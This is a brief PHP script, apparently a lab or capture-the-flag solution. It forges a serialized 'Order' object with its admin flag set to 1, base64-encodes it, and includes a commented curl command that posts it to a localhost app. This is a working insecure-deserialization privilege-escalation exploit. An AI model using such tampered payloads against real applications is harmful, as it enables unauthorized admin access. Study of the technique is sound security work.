<?php

class Order {
    public $vegetables;
    public $sauces;
    public $admin;
    public function __construct($vegetables, $sauces) {
      $this->vegetables = $vegetables;
      $this->sauces = $sauces;
      $this->admin = 0;
    }
  }

$thing = new Order([], []);
$thing->admin = 1;
echo base64_encode(serialize($thing));

// curl 'http://localhost/index.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://localhost' -H 'Connection: keep-alive' -H 'Referer: http://localhost/index.php' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' --data-raw 'encoded_order=Tzo1OiJPcmRlciI6Mzp7czoxMDoidmVnZXRhYmxlcyI7YTowOnt9czo2OiJzYXVjZXMiO2E6MDp7fXM6NToiYWRtaW4iO2k6MTt9'

?>